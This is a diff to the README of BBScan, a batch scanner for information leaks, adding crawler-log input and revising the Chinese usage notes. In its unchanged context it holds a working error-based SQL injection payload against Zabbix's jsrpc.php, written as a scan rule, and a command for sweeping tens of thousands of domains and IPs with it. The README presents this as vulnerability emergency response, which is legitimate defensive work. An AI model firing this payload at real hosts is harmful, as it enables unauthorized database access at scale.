@@ -53,6 +53,15 @@ You can install required packages with pip
 
 	python BBScan.py -d targets/
 
+**5. Load crawler logs from Directory(\*.log file only) and scan**
+
+	python BBScan.py --crawler crawler_logs/
+
+crawler log files should be formarted first:
+
+			. GET http://www.iqiyi.com/ HTTP/1.1^^^200
+			. POST http://www.pps.tv/login.php HTTP/1.1^^^user=admin&passwd=admin^^^200
+
 
 ## 使用说明 ##
 
@@ -70,12 +79,12 @@ BBScan是一个迷你的信息泄漏批量扫描脚本。 可以通过文本批�
 
 `-n, --no-crawl`  不从首页抓取新的URL
 
-`-nn, --no-check404` 参数指示不检查状态码404是否存在，不保存404页面的大小进行后续比对
+`-nn, --no-check404` 不检查状态码404是否存在，不保存404页面的大小进行后续比对
 
 
 ## web漏洞应急中的简单应用 ##
 
-以Zabbix SQL注入为例，在一个txt文件中写入规则：
+以批量扫描 Zabbix SQL注入为例，在一个txt文件中写入规则：
 
 	/zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tim%20estamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=hi%20story.php&profileIdx=web.item.graph&profileIdx2=(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),%20user())x%20from%20information_schema.character_sets%20group%20by%20x)y)&updateProfil%20e=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=%2017&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&%20mark_color=1    {tag="Duplicate entry"}  {status=200}  {type="text/plain"}
 	
@@ -87,7 +96,7 @@ BBScan是一个迷你的信息泄漏批量扫描脚本。 可以通过文本批�
 	不要检测404
 	并发2个线程、 50个进程
 
-很快就可以扫完几万个域名和IP地址。
+可以比较迅速地扫完几万个域名和IP地址：
 
 	BBScan.py --no-crawl --no-check404 -t2 -p50 -f iqiyi.http.txt
 
